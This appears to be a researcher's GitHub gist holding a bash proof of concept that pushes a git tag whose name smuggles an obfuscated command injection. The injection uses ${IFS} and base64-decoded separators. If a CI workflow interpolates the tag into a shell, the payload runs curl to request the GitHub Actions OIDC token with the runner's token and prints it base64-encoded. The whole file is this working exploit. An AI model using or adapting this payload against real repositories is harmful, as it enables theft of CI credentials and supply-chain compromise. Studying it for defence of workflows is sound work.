#date: 2024-03-14T17:05:42Z
#url: https://api.github.com/gists/67f93a8541d8154910dab3fc2bfc6237
#owner: https://api.github.com/users/fproulx-boostsecurity

#!/bin/bash
#set -x
git commit --allow-empty -m 'New release'
RND_SEMVER="v1.3.$((RANDOM % 1000))"
git tag $RND_SEMVER'$('\
'S="$(echo${IFS}-n${IFS}IA==|base64${IFS}--decode)";'\
'C="$(echo${IFS}-n${IFS}Og==|base64${IFS}--decode)";'\
'curl${IFS}'\
'-H"Authorization${C}${S}bearer${S}$ACTIONS_ID_TOKEN_REQUEST_TOKEN"${IFS}'\
'"$ACTIONS_ID_TOKEN_REQUEST_URL"'\
'|base64'\
')'
FINAL_TAG=$(git describe --tags --exact-match)
echo "$FINAL_TAG"
git push origin "$FINAL_TAG"